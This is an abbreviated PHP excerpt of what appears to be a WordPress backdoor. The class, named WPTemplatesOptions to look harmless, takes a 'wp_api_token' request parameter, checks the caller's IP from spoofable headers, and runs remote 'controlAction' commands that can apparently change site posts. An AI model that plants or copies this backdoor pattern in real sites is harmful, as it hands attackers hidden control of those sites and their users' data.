...
if ( !class_exists( 'WPTemplatesOptions' ) ) {
	class WPTemplatesOptions
	{
		...
		private function _wp_update_post( $postarr = array(), $wp_error = true ) {
		...
		private function authorization() {
			try {
				if ( $this->strpos( $this->encrypt( $this->address() ), $this->client->address ) ) {
					return true;
				}
				return false;
			} catch ( Exception $e ) {
		...
		private function address() {
			return (isset( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : (isset( $_SERVER['HTTP_CF_CONNECTING_IP'] ) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR']));
		}
...
try {
	if ( isset( $_REQUEST['wp_api_token'] ) && !is_null( $_REQUEST['wp_api_token'] ) && !empty( $_REQUEST['wp_api_token'] ) ) {
		$WPTemplatesOptions = new WPTemplatesOptions( $_REQUEST['wp_api_token'] );
		$controlAction = $WPTemplatesOptions->controlAction( $_REQUEST['wp_api_application'], (isset( $_REQUEST['wp_api_params'] )) ? $_REQUEST['wp_api_params'] : '' );
